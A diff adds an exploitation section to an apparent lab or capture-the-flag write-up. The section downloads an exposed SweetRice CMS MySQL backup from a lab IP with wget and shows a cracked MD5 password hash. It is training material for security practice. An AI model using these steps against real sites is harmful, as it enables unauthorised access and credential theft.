@@ -51,3 +51,31 @@ Further enumeration on `/content/` revealed:
 Visiting `/content/` revealed the site is running **SweetRice CMS**, which is known to be vulnerable.
 
 ---
+
+## 💥 Exploitation: SweetRice Backup Disclosure
+
+Visited:
+
+```
+http://10.10.187.142/content/inc/mysql_backup/
+```
+
+Found file:
+
+```
+mysql_backup_20191129023059-1.5.1.sql
+```
+
+Downloaded with:
+
+```bash
+wget http://10.10.187.142/content/inc/mysql_backup/mysql_backup_20191129023059-1.5.1.sql
+```
+
+Cracked MD5 hash:
+
+```
+42f749ade7f9e195bf475f37a44cafcb → Password123
+```
+
+---
